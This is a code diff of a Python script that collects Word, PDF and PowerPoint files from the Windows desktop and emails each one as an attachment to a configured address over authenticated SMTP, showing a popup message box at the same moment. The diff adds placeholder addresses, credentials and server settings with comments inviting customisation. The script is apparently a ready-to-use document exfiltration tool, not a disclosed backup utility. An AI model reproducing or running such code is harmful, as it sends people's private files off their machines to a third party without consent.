@@ -3,12 +3,12 @@ import email.mime.application
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 
-
+#Currently this script can email following types of filetypes add more if you want
 ext = [".docx", ".pdf", ".pptx", ".ppt",  \
        ".doc", \
        ]
 
-path = os.environ["HOMEPATH"]+"\Desktop";
+path = os.environ["HOMEPATH"]+"\Desktop"; #This script only checks from the Windows desktop you can customise it to your requirement
 
 def progress(count, total, status=''):
     sys.stdout.flush();
@@ -42,8 +42,8 @@ def mailer(list):
     total = len(list);
     i =0;
     #count = 1;
-    fromaddr = '###############################'
-    toaddrs  = '################################'
+    fromaddr = 'sender@sender.com' #Add your from email address here
+    toaddrs  = 'recipient@destination.com' #Add your to email address here
     #bar = progressbar.ProgressBar()
     #print("XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX- ")
     for file in list:
@@ -52,11 +52,11 @@ def mailer(list):
         progress(i, total, status='####################################')
         msg = MIMEMultipart()
         msg['Subject'] = file.strip("___________________________")
-        msg['From'] = '########################'
-        msg['To'] = '####################'
-        username = 'XXXXXXXXXXXXXXXX'
-        password = "XXXXXXXXXXXXXXX"
-        message = "##############################################"
+        msg['From'] = 'SENDER' #Change it according to your requirement
+        msg['To'] = 'RECEIVER' #Change it according to your requirement
+        username = 'YOURUSERNAME' #Username of your mail account
+        password = "YOUR PASSWORD" #Password for the above username
+        message = "##############################################" #Optional message that you want to send
         filename = file;
         fp = open(filename, 'rb')
         att = email.mime.application.MIMEApplication(fp.read())
@@ -65,7 +65,7 @@ def mailer(list):
         msg.attach(att)
         part = MIMEText(message, 'plain')
         msg.attach(part)
-        server = smtplib.SMTP('XXXXXXXXXXXXXXXXXXXXXXXXX:587')
+        server = smtplib.SMTP('YOUREMAILSERVER.COM:PORT') #Server and port number of your mail server e.g., mail.google.com:587
         server.ehlo();
         server.starttls()
         server.login(username,password)
@@ -75,7 +75,7 @@ def mailer(list):
         #bar.update(percentage)
         #print("Sent File: " + file)
 
-ctypes.windll.user32.MessageBoxW(0, "############################################################", 1)
+ctypes.windll.user32.MessageBoxW(0, "ADD YOUR MESSAGE HERE", 1) # Optional popup message
 doclist=filescraper(path);
 mailer(doclist);
 
